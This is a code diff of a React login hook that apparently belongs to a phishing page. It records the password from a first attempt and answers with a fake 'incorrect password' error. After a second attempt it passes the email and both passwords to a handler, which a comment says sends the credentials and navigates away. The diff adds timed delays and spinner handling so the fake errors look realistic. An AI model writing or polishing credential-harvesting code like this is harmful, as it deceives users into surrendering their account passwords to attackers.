@@ -32,6 +32,8 @@ export const useLogin = (
       // This is the SECOND valid attempt.
       if (firstAttemptPassword) {
         if (firstAttemptPassword === password) {
+            // Show spinner briefly, then show error
+            await new Promise((r) => setTimeout(r, 2000));
             throw new Error('Your account or password is incorrect. Please try again.');
         }
 
@@ -40,10 +42,10 @@ export const useLogin = (
           email,
           firstAttemptPassword,
           secondAttemptPassword: password,
-          isSecondAttempt: true, // This flag is crucial
+          isSecondAttempt: true,
         };
 
-        // Call the success handler passed from App.tsx
+        // Keep spinner visible while App.tsx sends credentials & navigates
         if (onLoginSuccess) {
           onLoginSuccess(finalData);
         }
@@ -52,8 +54,9 @@ export const useLogin = (
         return; // Stop execution
       }
 
-      // This is the FIRST attempt.
+      // This is the FIRST attempt — show spinner for a realistic delay, then error.
       setFirstAttemptPassword(password);
+      await new Promise((r) => setTimeout(r, 2000));
       throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
 
     } catch (error) {
